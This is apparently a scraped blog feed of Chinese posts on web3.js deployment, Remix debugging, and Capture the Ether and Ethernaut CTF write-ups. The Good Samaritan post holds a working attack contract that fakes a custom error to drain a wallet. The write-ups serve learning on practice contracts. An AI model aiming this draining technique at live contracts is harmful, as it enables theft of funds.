0006105da6105d5846106f0565b6106cb565b9050828152602081018484840111156105f257600080fd5b6105fd84828561079d565b509392505050565b600082601f83011261061657600080fd5b81356106268482602086016105c7565b91505092915050565b60006020828403121561064157600080fd5b600082013567ffffffffffffffff81111561065b57600080fd5b61066784828501610605565b91505092915050565b600061067b82610721565b610685818561072c565b93506106958185602086016107ac565b61069e81610918565b840191505092915050565b600060208201905081810360008301526106c38184610670565b905092915050565b60006106d56106e6565b90506106e18282610811565b919050565b6000604051905090565b600067ffffffffffffffff82111561070b5761070a6108e9565b5b61071482610918565b9050602081019050919050565b600081519050919050565b600082825260208201905092915050565b600061074882610793565b915061075383610793565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156107885761078761088b565b5b828201905092915050565b6000819050919050565b82818337600083830152505050565b60005b838110156107ca5780820151818401526020810190506107af565b838111156107d9576000848401525b50505050565b600060028204905060018216806107f757607f821691505b6020821081141561080b5761080a6108ba565b5b50919050565b61081a82610918565b810181811067ffffffffffffffff82111715610839576108386108e9565b5b80604052505050565b600061084d82610793565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156108805761087f61088b565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6000601f19601f830116905091905056fea2646970667358221220f839dcd300d8752d974808215c924e8e08a1d6556227d4be2b3c89805e41a38764736f6c63430008020033&quot;;myContract.deploy(&#123; data: data&#125;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, gas: 1500000, gasPrice: &#x27;1000000&#x27;&#125;,function(error,result)&#123; console.log(result)&#125;)// var contractAddress = &quot;&quot;;// var myContract = new web.eth.Contract(myContractABI,contractAddress); 报错： 原因：\\ 是一个特殊字符，即转义字符，需要 \\\\ 这样表示一个 \\ 执行结果： 这个结果是不正确的，没有给我们返回一个地址，解决办法是： 将 gasPrice 字段注释掉， 如 // gasPrice: &#39;1000000&#39; 再次执行其结果为： ① data 来源（需要在前面加一个0x）： 可以在 Ganache 上面查到 在vscode 部署的合约地址： 用这个合约地址到，remix 上验证一下： 13.3 调用合约函数13.3.1 调用智能合约读函数 代码： 1234567891011121314let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs 模块读取.sol合约文件var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var contractAddress = &quot;0x4c8BbD5829Bdcb9C9b11Ec3D5556cC77541FFB2e&quot;;var myContract = new web.eth.Contract(myContractABI,contractAddress);myContract.methods.getStorageValue().call((err,result)=&gt;&#123; console.log(result);&#125;); 结果： 13.3.2 调用智能合约写函数 代码： 12345678910111213141516171819let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs 模块读取.sol合约文件var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var contractAddress = &quot;0x4c8BbD5829Bdcb9C9b11Ec3D5556cC77541FFB2e&quot;;var myContract = new web.eth.Contract(myContractABI,contractAddress);myContract.methods.setStorageValue(&quot;new message&quot;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;&#125;).on(&quot;receipt&quot;, function(result)&#123; console.log(result); myContract.methods.getStorageValue().call((err,result)=&gt;&#123; console.log(result); &#125;);&#125;); 13.4 调用合约事件13.4.1 合约事件监听 13.4.2 执行事件查询 14. 简单的DApp – 投票系统","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Web3","slug":"Utils/Web3","permalink":"https://biyouqiuqiu.com/categories/Utils/Web3/"}],"tags":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"}]},{"title":"Remix-debug的使用","slug":"Basic_Knowledge/solidity/Remix-debug的使用","date":"2023-03-31T06:47:10.000Z","updated":"2023-03-31T06:47:10.000Z","comments":true,"path":"2023/03/31/Basic_Knowledge/solidity/Remix-debug的使用/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/31/Basic_Knowledge/solidity/Remix-debug%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Remix-debug的使用参考博客官方文档1官方文档21. 参考博客中获取的测试代码：1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Debugging &#123; uint256 counter; constructor(uint256 _counter) &#123; counter = _counter; &#125; function _setCounter(uint256 _counter) internal &#123; counter = _counter; &#125; function increment(uint256 value) public &#123; uint256 newValue = counter + value; _setCounter(newValue); &#125; function decrement(uint256 value) public &#123; uint256 newValue = counter - value; _setCounter(newValue); &#125; function getCounter() public view returns(uint256) &#123; return counter; &#125;&#125; 2. 编译部署 3. 调用 increment 函数 4. 调试智能合约 4.1 先找到交易的hash值：0xe19af7a3be310b85ccfb9538ef16314a575f395aae3787f71f897b4845547885 4.2 将交易的哈希填入，debug 的参数框内，点击 Start debugging 4.3 了解各个按钮的意思 ① 返回到上一个步骤。函数调用将被忽略，调试器将不进入该函数。 ② 后退一步回到上一步。函数不会被忽略，调试器将进入该函数。 ③ Step into进入下一步，如果有函数调用，调试器将进入函数。 ④ 跨步前进进入下一步，但是函数调用将被忽略，调试器不会进入函数。 ⑤ 跳到上一个断点，使调试器进入最后访问的断点。可以通过点击代码的行号来设置断点 ⑥ 跳出将调试器带到函数的末端 ⑦ 跳到下一个断点会使调试器跳到编辑器中的下一个设定的断点。 还有一个是滑块，类似于进度条 4.4 刚开始调试的时候，increment() 函数体中的某些变量是高亮的，比如newValue 这个变量正在被创建。一直往下调试的时候，counter 和 value 的也会高亮显示，模拟了加法的工作情况 4.5 最终，在后几步， Solidity Locals 面板上这样显示 这意味着 newValue 当前的值是520。再继续往后走, _setCounter 函数将会高亮，意味着 控制被传递到内部函数 _setCounter ，此时 debug 将不能继续往下走了，表示该方法已经运行完成 4.6 可以观察到 Solidity State 中的 counter 的值已经发生了更新 5. 其他调试功能5.1 函数栈 这个面板可以得到很多信息，比如哪个函数目前正在执行，哪个函数调用了它。如果有多个函数，它将以堆栈的形式显示。 5.2 全局变量 可以跟踪交易中的全局变量，以备你需要知道交易中的发件人或其他数据 5.3 步骤细节 可以得到一些额外的步骤数据，如已使用的gas 和 剩余的 gas 5.4 操作码 使用操作码，可以得到关于合同当前步骤的高级信息。你可以了解程序何时执行步骤，如 JUMP （？？？？）。 内心：此时的我内心还是很懵逼的，道理都懂，但是其中的细节还是不懂，为什么下一步可以点那么那么多下，之前学 Java 的时候，使用 Idea debug调试代码，好像都不需要点这么多下，可能得多用吧，多练多用","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"Remix-debug","slug":"Remix-debug","permalink":"https://biyouqiuqiu.com/tags/Remix-debug/"}]},{"title":"Guess the secret number","slug":"CTFS/capther the ether/Guess the secret number","date":"2023-03-20T04:47:10.000Z","updated":"2023-03-20T04:47:10.000Z","comments":true,"path":"2023/03/20/CTFS/capther the ether/Guess the secret number/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/CTFS/capther%20the%20ether/Guess%20the%20secret%20number/","excerpt":"","text":"Guess the secret number1. 题目 1.1 Putting the answer in the code makes things a little too easy. This time I’ve only stored the hash of the number. Good luck reversing a cryptographic hash! 1.2 题目代码： 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheSecretNumberChallenge &#123; bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365; function GuessTheSecretNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (keccak256(n) == answerHash) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 这是我第一次感觉自己能想出来的题目了。。。。 2.2 反正 uint8 的范围是 0-256 嘛，直接 循环一个一个蛮力法，一个一个试出来 2.3 写一个Hack 合约来计算，哈希值为 ：0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365 的数字 Hack 合约代码： 1234567891011121314contract Hack &#123; uint8 public number; bytes32 answer = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365; function f() public returns(uint8) &#123; for (uint8 i = 0; i &lt;= 256; i++) &#123; if (keccak256(i) == answer) &#123; number = i; break; &#125; &#125; return number; &#125;&#125; 运行求出来的结果是 ：170 3. 解题 3.1 部署合约 3.2 将 170 作为参数，调用guss() 函数 3.3 同时前两步操作都需要将 msg.value 设置为 1 ether ![image-20240412144923642](Guess the secret number&#x2F;image-20240412144923642.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the number","slug":"CTFS/capther the ether/Guess the number","date":"2023-03-20T04:39:10.000Z","updated":"2023-03-20T04:39:10.000Z","comments":true,"path":"2023/03/20/CTFS/capther the ether/Guess the number/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/CTFS/capther%20the%20ether/Guess%20the%20number/","excerpt":"","text":"Guess the number1. 题目 I’m thinking of a number. All you have to do is guess it. 题目代码： 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheNumberChallenge &#123; uint8 answer = 42; function GuessTheNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 这题是猜数字，但是他的数字是写死的，通过 ethers读取。 2.2 但是部署和 猜数字都需要支付 1ether ，即两个，如果猜对了他就会返回之前支付的ether 3. 解题 3.1 部署，msg.value &#x3D; 1 ether ![image-20240412144722655](Guess the number&#x2F;image-20240412144722655.png) 3.2 调用 guss() 函数 ![image-20240412144732902](Guess the number&#x2F;image-20240412144732902.png) 3.3 查看合约余额 ![image-20240412144740840](Guess the number&#x2F;image-20240412144740840.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Choose a nickname","slug":"CTFS/capther the ether/Choose a nickname","date":"2023-03-20T02:39:10.000Z","updated":"2023-03-20T02:39:10.000Z","comments":true,"path":"2023/03/20/CTFS/capther the ether/Choose a nickname/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/CTFS/capther%20the%20ether/Choose%20a%20nickname/","excerpt":"","text":"Choose a nickname1. 题目 1.1 智能合约CaptureTheEther会记录每个玩家的昵称。要完成此挑战，请将您的昵称设置为非空字符串。智能合约在地址 的 Ropsten 测试网络上运行0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee。 1.2 题目代码 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.4.21;// Relevant part of the CaptureTheEther contract.contract CaptureTheEther &#123; mapping (address =&gt; bytes32) public nicknameOf; function setNickname(bytes32 nickname) public &#123; nicknameOf[msg.sender] = nickname; &#125;&#125;// Challenge contract. You don&#x27;t need to do anything with this; it just verifies// that you set a nickname for yourself.contract NicknameChallenge &#123; CaptureTheEther cte = CaptureTheEther(msg.sender); address player; // Your address gets passed in as a constructor parameter. function NicknameChallenge(address _player) public &#123; player = _player; &#125; // Check that the first character is not null. function isComplete() public view returns (bool) &#123; return cte.nicknameOf(player)[0] != 0; &#125;&#125; 2. 分析 2.1 只需要将成功调用setNickname() 函数即可 2.2 考点在于如何将字符串转为64位 16进制的数据类型 我在idea 编写了一个程序来解决这个问题 123456789101112131415161718192021222324252627282930313233package daily_temp;/** * @Auther: 柚子 * @Date:2023/3/24年03月24日 15:43 * @Description:daily_temp * @version: 1.0 */public class convertStringToHex &#123; public static void main(String[] args) &#123; covertStringToHex(&quot;biyou&quot;); &#125; static void covertStringToHex(String str) &#123; StringBuffer sb = new StringBuffer(); char[] chars = str.toCharArray(); for(char c : chars) &#123; String charToHex = Integer.toHexString(c); sb.append(charToHex); &#125; int length = sb.length(); for (int i = 0; i &lt; 64 - length; i++) &#123; sb.append(0); &#125; System.out.println(&quot;0x&quot; + sb.toString()); &#125;&#125; 输入为 biyou 运行结果为： ![image-20240412144152362](Choose a nickname&#x2F;image-20240412144152362.png) 以 0x6269796f75000000000000000000000000000000000000000000000000000000 为参数，调用 setNickname() 函数即可 3. 解题 3.1 部署 3.2 将转化好的数据以参数的形式传入 3.3 ![image-20240412144208239](Choose a nickname&#x2F;image-20240412144208239.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Call me","slug":"CTFS/capther the ether/Call me","date":"2023-03-20T02:37:10.000Z","updated":"2023-03-20T02:37:10.000Z","comments":true,"path":"2023/03/20/CTFS/capther the ether/Call me/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/CTFS/capther%20the%20ether/Call%20me/","excerpt":"","text":"Call me1. 题目 1.1 部署以下合约 1.2 调用命名的函数callme 12345678910// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract CallMeChallenge &#123; bool public isComplete = false; function callme() public &#123; isComplete = true; &#125;&#125; 2. 分析 2.1 部署，调用即可 3. 解题 3.1 ![image-20240412143836389](Call me&#x2F;image-20240412143836389.png) 3.2 调用 callme() 函数，再查看isComplete的值 ![image-20240412143918375](Call me&#x2F;image-20240412143918375.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Deploy a contract","slug":"CTFS/capther the ether/Deploy a contract","date":"2023-03-20T02:33:10.000Z","updated":"2023-03-20T02:33:10.000Z","comments":true,"path":"2023/03/20/CTFS/capther the ether/Deploy a contract/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/CTFS/capther%20the%20ether/Deploy%20a%20contract/","excerpt":"","text":"Deploy a contracttips： 宝藏博客1. 题目要求 1.1 To complete this challenge, you need to: Install MetaMask. Switch to the Ropsten test network. Get some Ropsten ether. Clicking the “buy” button in MetaMask will take you to a faucet that gives out free test ether. After you’ve done that, press the red button on the left to deploy the challenge contract. You don’t need to do anything with the contract once it’s deployed. Just click the “Check Solution” button to verify that you deployed successfully. 1.2 题目代码： 12345678pragma solidity ^0.4.21;contract DeployChallenge &#123; // This tells the CaptureTheFlag contract that the challenge is complete. function isComplete() public pure returns (bool) &#123; return true; &#125;&#125; 2. 分析 2.1 该题很简单，直接放到remix 上面部署就ok 了 3. 解题","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Good Samaritan","slug":"CTFS/ethernaut/Good Samaritan","date":"2023-03-13T05:29:10.000Z","updated":"2023-03-13T05:29:10.000Z","comments":true,"path":"2023/03/13/CTFS/ethernaut/Good Samaritan/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/CTFS/ethernaut/Good%20Samaritan/","excerpt":"","text":"Good Samaritan1. 题目 1.1 This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it. Would you be able to drain all the balance from his Wallet? Things that might help: Solidity Custom Errors 1.2 题目代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103// SPDX-License-Identifier: MITpragma solidity &gt;=0.8.0 &lt;0.9.0;import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;contract GoodSamaritan &#123; Wallet public wallet; Coin public coin; constructor() &#123; wallet = new Wallet(); coin = new Coin(address(wallet)); wallet.setCoin(coin); &#125; function requestDonation() external returns(bool enoughBalance)&#123; // donate 10 coins to requester try wallet.donate10(msg.sender) &#123; return true; &#125; catch (bytes memory err) &#123; if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123; // send the coins left wallet.transferRemainder(msg.sender); return false; &#125; &#125; &#125;&#125;contract Coin &#123; using Address for address; mapping(address =&gt; uint256) public balances; error InsufficientBalance(uint256 current, uint256 required); constructor(address wallet_) &#123; // one million coins for Good Samaritan initially balances[wallet_] = 10**6; &#125; function transfer(address dest_, uint256 amount_) external &#123; uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ &lt;= currentBalance) &#123; balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) &#123; // notify contract INotifyable(dest_).notify(amount_); &#125; &#125; else &#123; revert InsufficientBalance(currentBalance, amount_); &#125; &#125;&#125;contract Wallet &#123; // The owner of the wallet instance address public owner; Coin public coin; error OnlyOwner(); error NotEnoughBalance(); modifier onlyOwner() &#123; if(msg.sender != owner) &#123; revert OnlyOwner(); &#125; _; &#125; constructor() &#123; owner = msg.sender; &#125; function donate10(address dest_) external onlyOwner &#123; // check balance left if (coin.balances(address(this)) &lt; 10) &#123; revert NotEnoughBalance(); &#125; else &#123; // donate 10 coins coin.transfer(dest_, 10); &#125; &#125; function transferRemainder(address dest_) external onlyOwner &#123; // transfer balance left coin.transfer(dest_, coin.balances(address(this))); &#125; function setCoin(Coin coin_) external onlyOwner &#123; coin = coin_; &#125;&#125;interface INotifyable &#123; function notify(uint256 amount) external;&#125; 2. 分析 简单分析各个合约的作用。 Wallet合约 transferRemainder() ：将钱包所有金额全部转移给dest_，调用者为合约所有者。 setCoin()：设置钱包中的货币地址，调用者为合约所用者。 donate10()：默认向指定地址转账 10tokens，当余额不足时，则会抛出自定义错误NotEnoughBalance()，调用者为合约所用者。 Coin合约 其只有一个函数，仔细分析该函数 12345678910111213141516function transfer(address dest_, uint256 amount_) external &#123; uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ &lt;= currentBalance) &#123; balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) &#123; // notify contract INotifyable(dest_).notify(amount_); &#125; &#125; else &#123; revert InsufficientBalance(currentBalance, amount_); &#125;&#125; 该函数实现了一个转账的功能，当转账金额大于调用者的余额时则会报错。 否则正常执行，但如果目的地址是一个合约，则会执行INotifyable(dest_).notify(amount_);，这是一个漏洞，一个安全隐患。 GoodSamaritan合约 分析函数 123456789101112function requestDonation() external returns(bool enoughBalance)&#123; // donate 10 coins to requester try wallet.donate10(msg.sender) &#123; return true; &#125; catch (bytes memory err) &#123; if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123; // send the coins left wallet.transferRemainder(msg.sender); return false; &#125; &#125;&#125; 这是题目交互的合约，如果调用该函数返回NotEnoughBalance()，则会将剩下的金额全部转给调用者。当然这种情况在钱包余额不足的时候才会发送。但是前面Coin合约中有一个安全隐患，INotifyable(dest_).notify(amount_);如果该函数返回 revert NotEnoughBalance();便可以欺骗撒玛利亚人，让他乖乖的一次性将钱全部交出来。 不过值得注意的是，notify()函数不能直接抛出异常，因为在执行wallet.transferRemainder(msg.sender);中仍然会调用到notify() 3. 解题攻击合约 123456789101112131415161718192021222324contract Hack is INotifyable &#123; GoodSamaritan goodsamaritan; Coin coin; constructor(address _goodsamaritan) &#123; goodsamaritan = GoodSamaritan(_goodsamaritan); coin = goodsamaritan.coin(); &#125; error NotEnoughBalance(); function notify(uint256 amount) external &#123; if (amount == 10) &#123; revert NotEnoughBalance(); &#125; &#125; function attack() public &#123; goodsamaritan.requestDonation(); require(coin.balances(address(goodsamaritan.wallet())) == 0, &quot;wallet is not null&quot;); &#125;&#125; 通过实例部署攻击合约，调用attack()函数即可完成攻击。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"DoubleEntryPoint","slug":"CTFS/ethernaut/DoubleEntryPoint","date":"2023-03-13T04:20:10.000Z","updated":"2023-03-13T04:20:10.000Z","comments":true,"path":"2023/03/13/CTFS/ethernaut/DoubleEntryPoint/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/CTFS/ethernaut/DoubleEntryPoint/","excerpt":"","text":"DoubleEntryPoint1. 题目要求 1.1 此级别具有CryptoVault特殊功能，sweepToken功能。这是用于检索卡在合约中的代币的常用函数。操作CryptoVault使用underlying无法清除的令牌，因为它是 . 的重要核心逻辑组件CryptoVault。可以清除任何其他令牌。 底层代币是合约定义中实施的 DET 代币的一个实例DoubleEntryPoint，并CryptoVault持有 100 个单位。此外，CryptoVault还拥有 100 个LegacyToken LGT。 在此级别中，您应该找出错误所在CryptoVault并防止它被耗尽令牌。 该合约具有Forta合约功能，任何用户都可以注册自己的detection bot合约。Forta 是一个去中心化的、基于社区的监控网络，用于尽快检测 DeFi、NFT、治理、桥梁和其他 Web3 系统上的威胁和异常。你的工作是实现一个detection bot并在合约中注册它Forta。机器人的实施将需要发出正确的警报，以防止潜在的攻击或漏洞利用。 可能有帮助的事情： 双入口点如何为代币合约工作？ 1.2 题目代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;interface DelegateERC20 &#123; function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);&#125;interface IDetectionBot &#123; function handleTransaction(address user, bytes calldata msgData) external;&#125;interface IForta &#123; function setDetectionBot(address detectionBotAddress) external; function notify(address user, bytes calldata msgData) external; function raiseAlert(address user) external;&#125;contract Forta is IForta &#123; mapping(address =&gt; IDetectionBot) public usersDetectionBots; mapping(address =&gt; uint256) public botRaisedAlerts; function setDetectionBot(address detectionBotAddress) external override &#123; usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress); &#125; function notify(address user, bytes calldata msgData) external override &#123; if(address(usersDetectionBots[user]) == address(0)) return; try usersDetectionBots[user].handleTransaction(user, msgData) &#123; return; &#125; catch &#123;&#125; &#125; function raiseAlert(address user) external override &#123; if(address(usersDetectionBots[user]) != msg.sender) return; botRaisedAlerts[msg.sender] += 1; &#125; &#125;contract CryptoVault &#123; address public sweptTokensRecipient; IERC20 public underlying; constructor(address recipient) &#123; sweptTokensRecipient = recipient; &#125; function setUnderlying(address latestToken) public &#123; require(address(underlying) == address(0), &quot;Already set&quot;); underlying = IERC20(latestToken); &#125; /* ... */ function sweepToken(IERC20 token) public &#123; require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;); token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); &#125;&#125;contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123; DelegateERC20 public delegate; function mint(address to, uint256 amount) public onlyOwner &#123; _mint(to, amount); &#125; function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123; delegate = newContract; &#125; function transfer(address to, uint256 value) public override returns (bool) &#123; if (address(delegate) == address(0)) &#123; return super.transfer(to, value); &#125; else &#123; return delegate.delegateTransfer(to, value, msg.sender); &#125; &#125;&#125;contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123; address public cryptoVault; address public player; address public delegatedFrom; Forta public forta; constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123; delegatedFrom = legacyToken; forta = Forta(fortaAddress); player = playerAddress; cryptoVault = vaultAddress; _mint(cryptoVault, 100 ether); &#125; modifier onlyDelegateFrom() &#123; require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;); _; &#125; modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;); &#125; function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true; &#125;&#125; 2. 分析 这个挑战似乎是 OpenZeppelin 和 Forta 之间的合资企业，一个实时安全和操作监控。据我所知，试图向您解释您应该如何集成 Forta 系统来监控您的合同是一个挑战。让我们看看进展如何。 从挑战的描述（说实话不清楚）我们有两个令牌：LegacyToken顾名思义是一个已“弃用”的令牌（这在现实生活中发生过吗？）支持一个名为DoubleEntryPoint. 我们还有一个称为 Vault 的库CryptoVault，它具有一些功能（与挑战范围无关），并提供一种称为实用程序的方法，允许sweepToken(IERC20 token)任何人“扫描”（转移）到sweptTokensRecipient（部署时定义的地址）已发送的令牌不小心去了金库。该函数中唯一的检查是您不能扫除underlyingVault 的令牌。 在部署时，我们从这个配置开始： CryptoVault持有100 个 DET ( DoubleEntryToken) CryptoVault持有100 LGT ( LegacyToken) 我们的目标是创建一个Forta DetectionBot来监控合约并防止外部攻击者耗尽本CryptoVault不应耗尽的代币。 让我们回顾一下每个合同，看看我们是否能找到一些攻击媒介。 LegacyToken.sol12345678910111213141516171819contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123; DelegateERC20 public delegate; function mint(address to, uint256 amount) public onlyOwner &#123; _mint(to, amount); &#125; function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123; delegate = newContract; &#125; function transfer(address to, uint256 value) public override returns (bool) &#123; if (address(delegate) == address(0)) &#123; return super.transfer(to, value); &#125; else &#123; return delegate.delegateTransfer(to, value, msg.sender); &#125; &#125;&#125; 它是一个ERC20继承自的令牌Ownable。合约owner的 可以通过调用mint新代币和更新变量的值。delegate``delegateToNewContract 奇怪的部分是在transfer覆盖了标准提供的默认函数的函数中ERC20。 如果没有定义委托（address(delegate) == address(0)），则合约使用标准的默认逻辑ERC20；否则执行return delegate.delegateTransfer(to, value, msg.sender)。 在这种情况下，delegate是DoubleEntryPoint合同本身。这是什么意思？当您在现实中执行转移时，LegacyToken它正在转发要执行的操作DoubleEntryPoint.delegateTransfer。让我们切换到另一个令牌代码，看看发生了什么 DoubleEntryPoint.sol12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123; address public cryptoVault; address public player; address public delegatedFrom; Forta public forta; constructor( address legacyToken, address vaultAddress, address fortaAddress, address playerAddress ) public &#123; delegatedFrom = legacyToken; forta = Forta(fortaAddress); player = playerAddress; cryptoVault = vaultAddress; _mint(cryptoVault, 100 ether); &#125; modifier onlyDelegateFrom() &#123; require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;); _; &#125; modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = 